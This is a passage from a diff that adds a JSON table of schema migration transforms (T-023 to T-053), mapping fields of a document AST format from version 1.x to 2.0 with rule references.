+    },
+    {
+      "id": "T-023",
+      "kind": "drop",
+      "from": "the former stored task state",
+      "to": "removed; the state derives from `task.mark`.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-024",
+      "kind": "rename",
+      "from": "`include.options` string pairs",
+      "to": "decoded typed option object; source quoting is written to a source-layout sidecar as optionSpelling when the caller asks for one and supplies the original source, and otherwise dropped.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-025",
+      "kind": "drop",
+      "from": "`thematic_break.marker`, `table.separatorWidths`, `table_row.continuationLines`, `table_cell.sourceContent`, `strong.boldItalic`",
+      "to": "dropped",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-026",
+      "kind": "move",
+      "from": "a definition inside a container",
+      "to": "not produced by the draft, which moves it to the document; no change",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-027",
+      "kind": "move",
+      "from": "a named `admonition` whose `kind` is not one of the eight admonition names",
+      "to": "a `div` with the name as its first class",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-028",
+      "kind": "version",
+      "from": "1.x bare document or envelope",
+      "to": "document.astVersion = \"2.0\" and matching envelope.astVersion; reject other major versions",
+      "migrationRule": "C2-A-012 C2-A-176 C2-A-177",
+      "silent": false
+    },
+    {
+      "id": "T-029",
+      "kind": "add",
+      "from": "common node fields",
+      "to": "optional typed metadata, opaque data, dir, lang and segments; only declared child slots contain nodes",
+      "migrationRule": "C2-A-027 C2-A-189",
+      "silent": false
+    },
+    {
+      "id": "T-030",
+      "kind": "rename",
+      "from": "definition/ref label or abbr",
+      "to": "key plus namespace; abbreviation.abbr becomes key",
+      "migrationRule": "C2-A-050 C2-A-070",
+      "silent": false
+    },
+    {
+      "id": "T-031",
+      "kind": "rename",
+      "from": "code_block.content, header and label",
+      "to": "value, syntax, title and groupLabel; code_block language is syntax",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-032",
+      "kind": "rename",
+      "from": "frontmatter/raw_block/raw_inline/literal_inline/math content; critic_comment.text",
+      "to": "value",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-033",
+      "kind": "split",
+      "from": "comment block, delimited and content",
+      "to": "form and value",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-034",
+      "kind": "merge",
+      "from": "list ordered, start, olType, delim, bareMarker, bulletChar; tight",
+      "to": "marker object; spacing = tight or loose",
+      "migrationRule": "C2-A-053 C2-A-054",
+      "silent": false
+    },
+    {
+      "id": "T-035",
+      "kind": "rename",
+      "from": "list.items, definition_list.items, table.rows, table_row.cells, citation_group.items",
+      "to": "children with typed child slots",
+      "migrationRule": "C2-A-050 C2-A-051",
+      "silent": false
+    },
+    {
+      "id": "T-036",
+      "kind": "split",
+      "from": "table.rows and rowGroups",
+      "to": "table_head, table_body, table_foot children, one table_body for each entry of rowGroups.bodies, which keeps its rowHeadColumns and whose headRows rows hold header cells (C2-B-230); table columns move to table_column nodes",
+      "migrationRule": "C2-A-050 C2-B-230",
+      "silent": false
+    },
+    {
+      "id": "T-037",
+      "kind": "split",
+      "from": "table_cell inline children and blocks",
+      "to": "cell_paragraph child for inline content; block children for other content",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-038",
+      "kind": "rename",
+      "from": "figure.target and shortCaption",
+      "to": "caption.short; the figure itself is unwrapped (T-051, T-052)",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-039",
+      "kind": "rename",
+      "from": "mention.user",
+      "to": "target, kind and optional label",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-040",
+      "kind": "rename",
+      "from": "inline_footnote.inline",
+      "to": "children",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-041",
+      "kind": "rename",
+      "from": "inline_extension.content",
+      "to": "children; declared props, slots, fallback, payload and resourceIds",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-042",
+      "kind": "rename",
+      "from": "heading_ref",
+      "to": "xref with key, namespace, href and display",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-043",
+      "kind": "split",
+      "from": "substitution or critic_substitution",
+      "to": "delete followed by insert",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-044",
+      "kind": "add",
+      "from": "image alt and target fields",
+      "to": "optional decorative, longDescription, targetKind and resourceId",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-045",
+      "kind": "add",
+      "from": "table cell accessibility",
+      "to": "optional scope and headerIds",
+      "migrationRule": "C2-A-050",
+      "silent": false
+    },
+    {
+      "id": "T-046",
+      "kind": "add",
+      "from": "resolution outputs",
+      "to": "generatedId, number, resolvedAlign, resolvedValign, href or src, display and table span counts remain in resolved tree",
+      "migrationRule": "C2-A-106 C2-A-162",
+      "silent": false
+    },
+    {
+      "id": "T-047",
+      "kind": "move",
+      "from": "source spelling and physical layout",
+      "to": "source-layout record from parseWithLayout; marker, fences, wraps, whitespace and quote choices",
+      "migrationRule": "C2-L-003",
+      "silent": false
+    },
+    {
+      "id": "T-048",
+      "kind": "drop",
+      "from": "0.1 rawRef, sourceFormat and layout-only fields",
+      "to": "use semantic fields; original spelling is unavailable without source/layout",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-049",
+      "kind": "add",
+      "from": "include directive",
+      "to": "include with path, section, typed valid options and the invalid options as written; no expansion in core tree",
+      "migrationRule": "C2-A-181",
+      "silent": false
+    },
+    {
+      "id": "T-050",
+      "kind": "add",
+      "from": "no extension source record; block extension deferred in an earlier draft",
+      "to": "qualified block_extension and inline_extension may carry a typed source record; a block extension has a required core fallback",
+      "migrationRule": "C2-A-122 C2-A-125 C2-X-024",
+      "silent": false
+    },
+    {
+      "id": "T-051",
+      "kind": "merge",
+      "from": "a figure that holds one image paragraph, code block, quote or math paragraph, and comments after it",
+      "to": "that block, with the caption and the attrs of the figure in its own fields; the comments go where C2-A-082 places them; kind is dropped",
+      "migrationRule": "C2-A-082 C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-052",
+      "kind": "move",
+      "from": "any other figure",
+      "to": "a figure_group with the same children, caption and attrs; kind is dropped",
+      "migrationRule": "C2-A-084 C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-053",
+      "kind": "move",
+      "from": "table_body.headRows",
+      "to": "dropped; the groups hold the partition, and the count is written to a source-layout sidecar as headerRows when the caller asks for one and supplies the original source, and otherwise dropped",
+      "migrationRule": "C2-A-088 C2-A-178",
+      "silent": false
+    }
+  ]
+}
